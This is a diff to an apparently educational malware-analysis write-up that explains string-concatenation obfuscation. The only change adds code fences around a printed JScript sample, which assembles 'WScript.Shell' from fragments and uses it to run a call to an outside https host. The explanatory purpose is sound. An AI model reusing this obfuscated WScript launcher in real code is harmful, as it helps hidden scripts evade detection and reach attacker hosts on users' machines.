@@ -17,6 +17,7 @@ Select download which saves the file to text.txt
 
 6. Reviewing text:txt, the file is JavaScript referenced by the original cmd file:
 
+```
 var CSaJ="W"+"sC"+"R";
 var DSaJ="iP"+"t.";
 var ESaJ="Sh"+"El"+"l";
@@ -24,6 +25,7 @@ var FSaJ="h"+"T"+"T";
 var GSaJ="p"+"s:/"+"/";
 var shell = new ActiveXObject(CSaJ+DSaJ+ESaJ);
 shell.run(FSaJ + GSaJ + "attackndefend.com");
+```
 
 The first type of obfuscation is called string concatenation, where parts of a string are separated and combined using a concatenation operator, such as the "+" symbol in this example.
 
